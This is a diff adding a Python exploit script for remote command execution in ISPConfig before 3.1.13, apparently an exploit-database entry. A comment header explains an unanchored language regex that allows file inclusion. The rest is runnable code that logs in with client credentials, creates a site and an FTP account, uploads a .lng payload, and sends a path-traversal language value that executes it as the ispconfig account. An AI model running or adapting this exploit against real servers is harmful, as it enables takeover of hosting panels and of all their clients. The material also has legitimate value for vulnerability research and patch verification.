@@ -1,0 +1,143 @@
+# Title: ISPConfig < 3.1.13 - Remote Command Execution
+# Author: 0x09AL 
+# Date: 20/08/2018
+# Vendor: https://www.ispconfig.org/
+# 
+# Vulnerability Description
+#
+# There is an include on almost all the php files, which includes the language template.
+# For example:
+
+# In password_reset.php - Line 46 the following code tries to include the filename 
+# that is specified in the $_SESSION['s']['language'] variable.
+#
+# include ISPC_ROOT_PATH.'/web/login/lib/lang/'.$_SESSION['s']['language'].'.lng';
+# 
+# Searching a little bit where the $_SESSION['s']['language'] variable is set we can find a reference in user_settings.php
+# if(preg_match('/[a-z]{2}/',$_POST['language'])) {
+#            $_SESSION['s']['user']['language'] = $_POST['language'];
+#            $_SESSION['s']['language'] = $_POST['language'];
+#        } else {
+#            $app->error('Invalid language.');
+#        }
+# 
+# The regex checks if the language contains two lower-case characters.
+# The problem is that everything that contains two [a-z] characters will match the regex.
+# Developer probably missed the ^ $ on the regex to match the entire file.
+#
+# Since in the new versions of php we can not use null byte injections, either a path-truncation attack
+# we can create a ftp-account, upload the file we want to include with .lng extension at our path and the code 
+# will get executed as the ispconfig account and not as our chroot-ed account.
+#
+# This exploit can be triggered by having clients credentias , and exploiting this vulnerability we can compromise
+# the entire clients.
+#
+# You need to specify the hostname:port , username, and password of the client.
+
+import requests
+import ftplib
+import json
+import time
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+host = "host:8080"
+username = "username"
+password = "password"
+
+exp = requests.session()
+user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'
+ftp_username = "randomusr1"
+domain = "pwned.com"
+site_id = 1
+payload_name = "pwned1"
+path = ""
+
+
+
+def login():
+  r = exp.post('https://%s/login/index.php' % host,data={'username':username,'password':password,'s_mod':'login','s_pg':'index'},verify=False)
+  if(r.text.find("wrong")>0):
+    print "[-] Incorrect credentials [-]"
+  else:
+    print "[+] Logged in Succesfully [+]"
+
+
+def createSite():
+  
+  r = exp.get('https://%s/sites/web_vhost_domain_edit.php' % host,verify=False)
+  _csrf_key = r.text.split('name="_csrf_key" value="')[1].split('"')[0]
+  _csrf_id = r.text.split('name="_csrf_id" value="')[1].split('"')[0]
+  phpsessid = r.text.split('name="phpsessid" value="')[1].split('"')[0]
+  r = exp.post('https://%s/sites/web_vhost_domain_edit.php' % host,data={'server_id':1,'ip_address':'*','ipv6_address':'','domain':'%s' % domain,'hd_quota':1024,'traffic_quota':1024,'subdomain':'www','php':'no','fastcgi_php_version':'','active':'y','id':'','_csrf_id':'%s' % _csrf_id,'_csrf_key':'%s' % _csrf_key,'next_tab':'','phpsessid':'%s' % phpsessid},verify=False)
+  pass
+
+def createFtp():
+  global site_id
+  r = exp.get('https://%s/sites/ftp_user_edit.php' % host,verify=False)
+  print "[+] Getting IDSof the sites [+]"
+  temp_array = r.text.split('<option value=')
+  nr_sites = len(temp_array)
+  print "[+] Number of sites %d [+]" % (int(nr_sites) - 1)
+  # Find the latest created site by checking the ID.
+  max_id = -9999
+
+  for i in range(1,nr_sites):
+    temp = int(temp_array[i].split('>')[0].replace("'",""))
+    if(temp > max_id):
+      max_id = temp
+  site_id = max_id
+  print "[+] Newly created site id is : %d [+]" % site_id
+  _csrf_key = r.text.split('name="_csrf_key" value="')[1].split('"')[0]
+  _csrf_id = r.text.split('name="_csrf_id" value="')[1].split('"')[0]
+  phpsessid = r.text.split('name="phpsessid" value="')[1].split('"')[0]
+  r = exp.post('https://%s/sites/ftp_user_edit.php' % host,data={'parent_domain_id':site_id,'username':'%s' % ftp_username,'password':'%s' % password,'repeat_password':'%s' % password,'quota_size':1024,'active':'y','id':'','_csrf_id':'%s' % _csrf_id,'_csrf_key':'%s' % _csrf_key,'next_tab':'','phpsessid':'%s' % phpsessid},verify=False)
+  print "[+] Created FTP Account [+]"
+  pass
+
+
+def uploadPayload():
+  ftp = ftplib.FTP(host.split(":")[0])
+  ftp.login(username+ftp_username, password)
+  ftp.cwd("web")
+  ftp.storlines("STOR %s.lng" % payload_name,open("test.txt"))
+  print "[+] Payload %s uploaded Succesfully [+]" % payload_name
+  pass
+
+def waitTillCreation():
+  while 1:
+    print "[+] Trying [+]"
+    r = exp.get('https://%s/datalogstatus.php' % host,verify=False)
+    temp = json.loads(r.text)
+    if(temp["count"] == 0):
+      print "[+] Everything created .... [+]"
+      return
+    time.sleep(5)
+
+def getRelativePath():
+  
+  global path
+
+  r = exp.get('https://%s/sites/web_vhost_domain_edit.php?id=%d&type=domain' % (host,site_id),verify=False)
+  path = r.text.split('Document Root</label>')[1].split('<div class="col-sm-9">')[1].split('<')[0]
+  path += "/web/" + payload_name
+  print "[+] Uploading payload in %s [+]" % path
+
+def triggerVuln():
+  r = exp.get('https://%s/tools/user_settings.php' % host,verify=False)
+  _csrf_key = r.text.split('name="_csrf_key" value="')[1].split('"')[0]
+  _csrf_id = r.text.split('name="_csrf_id" value="')[1].split('"')[0]
+  phpsessid = r.text.split('name="phpsessid" value="')[1].split('"')[0]
+  user_id = r.text.split('name="id" value="')[1].split('"')[0]
+  r = exp.post('https://%s/tools/user_settings.php' % host,data={'passwort':'','repeat_password':'','language':'../../../../../../../../../../../../../..%s' % path,'id':'%s' % user_id,'_csrf_id':'%s' % _csrf_id,'_csrf_key':'%s' % _csrf_key,'next_tab':'','phpsessid':'%s' % phpsessid},verify=False)
+  r = exp.get('https://%s/index.php'% host,verify=False)
+  print r.text
+
+login()
+createSite()
+createFtp()
+getRelativePath()
+waitTillCreation()
+uploadPayload()
+triggerVuln()
